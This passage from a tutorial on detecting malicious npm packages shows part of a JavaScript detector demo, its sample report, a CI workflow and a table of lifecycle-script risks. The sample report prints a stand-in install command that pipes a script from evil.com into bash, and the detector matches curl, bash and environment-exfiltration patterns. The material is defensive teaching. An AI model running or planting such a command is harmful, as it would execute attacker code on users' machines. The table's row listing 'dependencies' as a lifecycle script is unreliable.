    // Create test packages
    testPackages.forEach(pkg => {
        createPackage(
            pkg.name,
            pkg.scripts || {},
            pkg.dependencies || {},
            pkg.isPrivate || false
        );
        console.log(`✅ Created test package: ${pkg.name}`);
    });
    
    return testDir;
}

/**
 * Main demonstration
 */
function runDetectionDemo() {
    console.log('🚀 Starting Malicious Package Detection Demo');
    console.log('='.repeat(60));
    
    // Create test packages
    const testDir = createTestPackages();
    console.log(`\n📁 Test packages created in: ${testDir}\n`);
    
    // Analyze each package
    const packages = fs.readdirSync(testDir);
    packages.forEach(pkgDir => {
        const pkgPath = path.join(testDir, pkgDir);
        if (fs.statSync(pkgPath).isDirectory()) {
            console.log('\n' + '🔍'.repeat(30));
            const results = detectMaliciousPackage(pkgPath);
            const report = generateReport(results);
            console.log(report);
        }
    });
    
    console.log('\n✅ Detection demo complete');
    console.log('💡 Tip: Use this detector on real packages:');
    console.log(`   const results = detectMaliciousPackage('/path/to/package');`);
    console.log(`   console.log(generateReport(results));`);
}

// ==========================================
// 5. MAIN EXECUTION
// ==========================================

// Run the demonstration
runDetectionDemo();

// Export for use as a module
module.exports = {
    detectMaliciousPackage,
    generateReport,
    detectionRules
};
```

---

## The Verification: Testing Our Implementation

Let's verify our implementation works correctly.

**✅ Verification Step 1: Run the Lifecycle Tracer**

```bash
# From the phase-1 directory
$ node 06-lifecycle-tracer.js
```

You should see output tracing the installation of test packages:

```
[2024-...] [INFO] 🚀 Starting npm Install Lifecycle Tracer
[2024-...] [INFO] Log file: .../install-trace.log
[2024-...] [WARN] Script execution: DISABLED (simulation)
[2024-...] [INFO] Created test package: safe-package
...
```

**✅ Verification Step 2: Run the Malicious Package Detector**

```bash
$ node 07-malicious-detector.js
```

You should see detection reports for each test package:

```
============================================================
🔒 MALICIOUS PACKAGE DETECTION REPORT
============================================================

📦 Package Information:
   Name: malicious-shell-exec
   Version: 1.0.0
   Scripts: install, postinstall

📊 Risk Summary:
   Risk Score: 20/100
   Risk Level: CRITICAL
   Detections: 3

⚠️  Detections:
   1. [CRITICAL] Shell Execution
      Package executes shell commands
      Script: install
      Command: curl http://evil.com/malware.sh | bash
      Patterns: curl, bash
...
```

**✅ Verification Step 3: Check the Log File**

```bash
$ cat install-trace.log
```

You should see detailed logs of the trace process.

**✅ Verification Step 4: Test Interactive Mode**

```bash
$ node 06-lifecycle-tracer.js --interactive
```

You should be prompted with options to analyze packages interactively.

---

## Understanding the Results

### What We Detected

Our malicious package detector identified:

1. **Environment Variable Exfiltration** (MAL-001) - Detected by `process.env` access patterns
2. **Shell Execution** (MAL-004) - Detected by `exec`, `curl`, `bash` patterns
3. **Filesystem Access** (MAL-002) - Detected by `fs.writeFileSync` patterns
4. **Typosquatting** (MAL-007) - Detected by name similarity to popular packages
5. **Dependency Confusion** (MAL-008) - Detected by private packages with many public dependencies

### Risk Scoring System

| Risk Level | Score Range | Action Required |
|------------|-------------|-----------------|
| CRITICAL | 20+ | Immediate blocking, security alert |
| HIGH | 10-19 | Manual review, isolated testing |
| MEDIUM | 5-9 | Security audit recommended |
| LOW | 0-4 | Standard review |

### Real-World Application

This detector can be integrated into CI/CD pipelines:

```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm install
      - name: Scan dependencies
        run: |
          for pkg in node_modules/*; do
            node phase-1/07-malicious-detector.js $pkg
          done
```

---

## Key Takeaways from Phase 1, Part 2

1. **npm install executes multiple phases** - Preinstall, install, and postinstall scripts run with full permissions

2. **Lifecycle scripts are dangerous** - They can execute arbitrary code during installation

3. **Detection requires behavioral analysis** - Traditional CVE scanning misses these threats

4. **Multiple attack vectors exist** - Environment exfiltration, shell execution, filesystem access, typosquatting, dependency confusion

5. **Risk scoring helps prioritize** - Not all detections are equal; critical issues should be blocked immediately

6. **Automated detection is possible** - Our detector can be integrated into CI/CD pipelines

In the next part, we'll combine everything we've learned to build a complete security scanner that integrates behavioral detection with traditional CVE checking, creating a comprehensive solution for modern supply chain security.

---

## Reference: Complete npm Lifecycle Scripts

| Script | Runs During | Security Risk |
|--------|-------------|---------------|
| `preinstall` | Before installation | HIGH - Runs before any security checks |
| `install` | During installation | CRITICAL - Full execution during installation |
| `postinstall` | After installation | CRITICAL - After permissions are set |
| `preuninstall` | Before uninstallation | MEDIUM - Can prevent uninstallation |
| `uninstall` | During uninstallation | MEDIUM - Can execute during removal |
| `postuninstall` | After uninstallation | LOW - Limited impact |
| `preversion` | Before version bump | MEDIUM - Can modify package.json |
| `version` | During version bump | MEDIUM - Can execute during release |
| `postversion` | After version bump | LOW - Limited impact |
| `pretest` | Before tests | MEDIUM - Can interfere with testing |
| `test` | During tests | MEDIUM - Can hide malicious activity |
| `posttest` | After tests | LOW - Limited impact |
| `prepublish` | Before publishing | HIGH - Can modify publish process |
| `prepare` | During installation | HIGH - Runs with npm install |
| `prepack` | Before packing | MEDIUM - Can modify package contents |
| `postpack` | After packing | LOW - Limited impact |
| `dependencies` | After installation | HIGH - Can modify dependencies |
